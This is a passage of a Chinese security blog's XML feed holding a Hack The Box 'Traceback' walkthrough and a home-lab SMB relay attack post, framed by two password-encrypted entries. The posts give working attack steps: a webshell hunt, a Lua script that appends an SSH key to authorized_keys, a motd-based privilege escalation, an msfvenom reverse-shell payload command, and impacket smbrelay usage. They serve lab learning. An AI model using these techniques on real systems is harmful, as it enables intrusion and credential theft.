QnvwuH4DO4yVPuCLR7h7QmIm6jAd3fMOScDnNThHJP0d+1PeMQp68IF0u2IdHHBVXvwDDMyRDkiR0qTslb5lDAc1bCZ4Q/7rrTkHdpQfSB8nOqkFXSmesTWI1fq363Zf3dbKtHlA2zGEc8XPcXdFPbbwsQVv7jJ3EPvTqSQwZZqHl+gku4QGogSgGSlWzI1yaU4MPVpDgtSZEGxIvQ7oigvfp0YrVYN3lVWTcGmFkAUaywSwqPRrHVfJbX1wSPYaNf4+tkvLHiSgIN66TCh3LlFqnBbybh5tOYsKkG0MHaaq2jRrtdWBuryXfciM8MX0I9dobsIEIsa2wjmYG/6KY6qlPMTtm/N8/LDn65Jp9FS3goWS+6FQv924ah7lfpjQi+V+PPwiABa4Atkhgh4mPNDGJhvbPksztqpu3/L0T0Z4jadKrxnJ03kbYmNq4CFwb2QYuPG9YmKApuqOV3b45eqI50kBa+jMWciCRyc4A8U7A/8zVf1C7/3YID/dxIsfMZ3t5fUwaGzbPqDB+EQpBqJ9ZZhzljjPNAOlh6jm7u3AHoopguAQJixR32nsvMhtOVeJn0S3DwYEwaYbdvApfz0GXnhplUBs/6zDuRrLX5BMNLBQukUhOrmz6yLjwZ3E6U3WEd8JaeSt4i7wbAC/iuIsCRbB3J0dBAs/u50LyPGEHyLU2qIXnoLpKP3E2lIiK/paoumtsmzKpiCESCIBZYWLX1XYL0W9orfH/EL2o9t45KJ6GRpGk+5+mVOwrPDoXNj5N3l8kIcCUliQDrRhiMvDU6raG1VAdVYd+1rsbWbLEY1q5oWK+ENFwZSKhLm1zAfxGO/JF75im98sPZ1f42Z4seKlTpM47IP36uX9wl43WHjHgFrzDsgKI2Xh7HJ7KdJgpKNc86FRKiSFEruRvtCEuuszf2F1y3Q10WZdjxvdUGfSVLZ+hDi6YSGOROuzCidqn0VQoJo9YYnwIiurWJD3USMOHCQ5cLCndWPbQmcBSkKFn2lv1Div+jfc4+PRKr9gmm7Hd3YFxmyy8huyHgkeTKfxBVgHa93LQCc6li2w+excmFEN3hus1hN6304JnW606RyQ4yZmshyvR28jkKFgdeYfwyAyBWmXmMerVpMsoDuAwxYv1V8hSSbpGJqGzSfyBOc2GzSr2DoVQjkTP1dDedtUFcWImlCHug1bi8K2324RCIrRe3Yu5DfAlKCZfqku/uI2fnIUGZ/2Ukpz97jpqy3NSSAOjOUmJPQz1vfl3WeWLY3GVi1rrXv5JdY9NXmpkpOg987Gg5wX0ji25ddyXElqSyn3eSPX4HBZEFzboMJm2F4Swgk5pCg4UdTkHVPBBe0ty3XSO/QIvngBFbOCaZApqYtc0j0QxSd/6hDWyWlCOkba76mU82uEfxwUaU+MgsO8ywGmT9e4JyEWvpT93Gd4yJ27G25xa/cccM1SvFdSmD/owW4dEL2pK4NcUShcDyMeRei7BeHS0tWEQLWv7nOsoYgo7tjOM6/vTDEhK3hbWcxL/S3lk05q6dueiByAZsYYOe1fdoVKYGtOgKPNG5vR9m7mvFrg9iekjTheR2ENI7B560qxEGIWdCWqWMww/8R01maPTTYN36b/Z+SVivPrX9pTv3ziXh4Y8LvC8QLFPc6WYpmqKUD6x7pyPAZdGBIeUr2uC/yhfouUVOSmXAulu8fIR5tKFhSIFkF2nogt9EuLp9Jb+GaRDcELMIyy9GydnSBGM4dmwu8tV+NOANL0f+JK/Qlvu47jw66akt5A=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> 极客 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box - Traceback</title>
      <link href="/posts/d3c4764b.html"/>
      <url>/posts/d3c4764b.html</url>
      <content type="html"><![CDATA[<h2 id="0x00-靶场介绍"><a href="#0x00-靶场介绍" class="headerlink" title="0x00 靶场介绍"></a>0x00 靶场介绍</h2><p>这是一个比较简单的靶场，但是由于是发现后门上马。然后才进行一步提权，这个步骤有太多恶心的人删文件和不断重置靶机。。。刚刚写个ssh_key就给我删了，我佛了<br><img src="https://s1.ax1x.com/2020/03/25/8vFVkd.png" alt=""></p><h2 id="0x01过程"><a href="#0x01过程" class="headerlink" title="0x01过程"></a>0x01过程</h2><p>nmap开局扫描</p><pre><code>nmap -sV -sC 10.10.10.181</code></pre><p>由于忘记截图了，就用之前复制到文本的里的结果</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 22:24 EDTNmap scan report for 10.10.10.181Host is up (0.29s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Help usAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.2 - 4.9 (93%), Android 4.2.2 (Linux 3.4) (92%), Adtran 424RG FTTH gateway (92%), Linux 3.10 (92%), Android 4.1.2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 443/tcp)HOP RTT       ADDRESS1   290.33 ms 10.10.14.12   290.45 ms 10.10.10.181OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 543.69 seconds</code></pre><p>打开80一看<br><img src="https://s1.ax1x.com/2020/03/25/8vAYQ0.png" alt=""></p><p>意思这个站被日了，by Xh4H这个人搞的。查看网页源码的时候，发现提示<br><img src="https://s1.ax1x.com/2020/03/25/8vA6Qx.png" alt=""></p><p>提示留了后门，让你自己去找。Google了一波Xh4H这个人，在github中发现一个webshell的项目<br><img src="https://s1.ax1x.com/2020/03/25/8vVnUg.png" alt=""></p><p>尝试将shell的名称做成字典去跑</p><pre><code>wfuzz -w /root/Desktop/file.txt -u http://10.10.10.181 --hc 404,403</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8vV2Ie.png" alt=""></p><p>访问如下<br><img src="https://s1.ax1x.com/2020/03/25/8vVqIg.png" alt=""></p><p>随手试了一下admin admin，进去了<br><img src="https://s1.ax1x.com/2020/03/25/8vmWiF.png" alt=""></p><p>知道当前用户为webadmin，利用webshell进/home/webadmin/,ssh目录里写了个公钥，用私钥连上了ssh<br><img src="https://s1.ax1x.com/2020/03/25/8vMTpD.png" alt=""></p><p>查看了一波.bash_history<br><img src="https://s1.ax1x.com/2020/03/25/8vMamn.png" alt=""></p><p>看了一下那个lua,当时是这样的</p><pre><code>local test = io.open(&quot;/home/sysadmin/.ssh/authorized_keys&quot;, &quot;a&quot;)test:write(&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDp3ANscyE/wYAJhH6FTHE7rbj+AlZs3ziQTrjojQ913UUFd5FHSfI83ed8efWrFCZB0RJKRQvFbsVu1ts2YuCM+Ziekn9uXarA47YHo7gfXpq0Ttb1jliooh8zcCd7ooFMjoRFnkBwKmGG/nknIQJQlEtyyEoCeBPpBLA/g7AHCuztZ38JWQUoJHBI1X8zm3IjPsDnrfcX6DqYGpEYmPY0isUQsCVOM7RXZVSZTyoJy9X7Iw/j8s1eiShvgs9o2N6HL7bNt8xDeRnM99k2uf5m5TaQ5peex/3SceUnqXkeueqq4VqE7QJZPMlPuMezh2bauqh0fNVyBIUFtFrrtGZF6+xkYiE443Ci/uGWqOvYhF4NgbfsWIwgIh/r6XziOWqDuoJpgU5f4s1IYJTMYoKdRkSELMukUmOJGuFEuaeZfzwniz9+1Y+SEOCOeGe2gTWnr9m9OzCozGrAGDEvF2kVGgcby+6/9ZFN5PQqAZkhNmIulYmlN52ecybeJTsVsKE= root@parrot\n&quot;)test.close()</code></pre><p>然后照搬，自己加个公钥。跟着执行了一下，在用sysadmin用户登录ssh<br><img src="https://s1.ax1x.com/2020/03/25/8vl8MQ.png" alt=""></p><p>之后从本机远程下载pspy64过去，查看了一波高权进程<br><img src="https://s1.ax1x.com/2020/03/25/8vlqot.png" alt=""></p><p>在对id为0的执行路径逐个排查的时候发现一个目录有sysadmin权限可以查看<br><img src="https://s1.ax1x.com/2020/03/25/8v1SyQ.png" alt=""></p><p>/etc/update-motd.d/目录下的目录sysadmin用户可以编辑，查看000-header的时候发现是ssh登录欢迎信息，尝试输出id到文件里会不会执行<br><img src="https://s1.ax1x.com/2020/03/25/8v391O.png" alt=""></p><p>重新登录ssh，发现运行了id命令<br><img src="https://s1.ax1x.com/2020/03/25/8v3FnH.png" alt=""></p><p>改为读key的命令<br><img src="https://s1.ax1x.com/2020/03/25/8vUteS.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>smb中继攻击</title>
      <link href="/posts/99700841.html"/>
      <url>/posts/99700841.html</url>
      <content type="html"><![CDATA[<h2 id="0x00介绍"><a href="#0x00介绍" class="headerlink" title="0x00介绍"></a>0x00介绍</h2><p>先知社区的文章：</p><blockquote><p>SMB重放攻击：当访问格式为\IP\File的时候，会默认将当前用户密码凭证送到SMB服务进行认证，失败后才弹出需要输用户密码的对话框，但此时SMB服务器已经收到了相应数据，通过抓包即能获取到用户凭证。<br>有了这个凭证，再进一步利用Hashcat等工具进行破解即有可能 得到能利用的用户密码。</p></blockquote><p>个人理解：<br><img src="https://s1.ax1x.com/2020/03/22/84hfyT.png" alt=""></p><h2 id="0x01实验过程"><a href="#0x01实验过程" class="headerlink" title="0x01实验过程"></a>0x01实验过程</h2><p>内网有三台主机-&gt;</p><pre><code>Windows server 2008 R2 DC：192.168.1.108Windows server 2008 R2：192.168.1.110Kali：192.168.1.109</code></pre><p>kali实现端口流量转发，域内主机(110那台)访问了攻击机的IP，输入了凭证之后。将凭证交给攻击者后，攻击机将凭证转交给DC。如果DC登录成功，则代表验证成功。将上传攻击机生成的马子并执行</p><p>在kali上监听生成马子并监听msf</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=4444 -e x64/xor -i 20 -f exe -o test.exe</code></pre><p><img src="https://s1.ax1x.com/2020/03/22/844t74.png" alt=""></p><p>使用impacket工具包里的smbrelay</p><pre><code>命令格式：python smbrelay.py -h &lt;被攻击的机子&gt; -e &lt;认证成功后执行的马&gt;</code></pre><p>在使用server02访问kali IP<br><img src="https://s1.ax1x.com/2020/03/22/845Zgx.png" alt=""></p><p>成功后会抓到正确的NTLM-HASH-HASH<br><img src="https://s1.ax1x.com/2020/03/22/844v3q.png" alt=""></p><p>msf也会上线<br><img src="https://s1.ax1x.com/2020/03/22/845bM6.png" alt=""></p><p>如果认证失败则返回错误信息<br><img src="https://s1.ax1x.com/2020/03/22/84Iisf.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/03/22/84Iwy6.png" alt=""></p><h2 id="0x02结论"><a href="#0x02结论" class="headerlink" title="0x02结论"></a>0x02结论</h2><p>我认为实际上成功几率应该很低，钓鱼拿hash的方法应该更高（虽然破解hash是个问题）。先知社区那篇文章结尾那个方法，通过中继dump SAM文件里的HASH，拿到NT LM HASH后。使用wmicexec直接连接即可（虽然也是中继）<br><img src="https://s1.ax1x.com/2020/03/22/84oEX6.png" alt=""></p><p>先设置responder.conf，关闭smb和http<br><img src="https://s1.ax1x.com/2020/03/22/85k7EF.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/03/22/85F0wF.png" alt=""></p><h2 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h2><p><a href="https://www.anquanke.com/post/id/177123" target="_blank" rel="noopener">内网渗透——针对hash的攻击 - 安全客，安全资讯平台</a><br><a href="https://klionsec.github.io/2016/07/20/smb-replay-attack/" target="_blank" rel="noopener">smb重放攻击 [smb中间人] - klion’s blog</a><br><a href="https://xz.aliyun.com/t/7234" target="_blank" rel="noopener">钓鱼配合smb重放攻击 - 先知社区</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box Sauna</title>
      <link href="/posts/89c302fc.html"/>
      <url>/posts/89c302fc.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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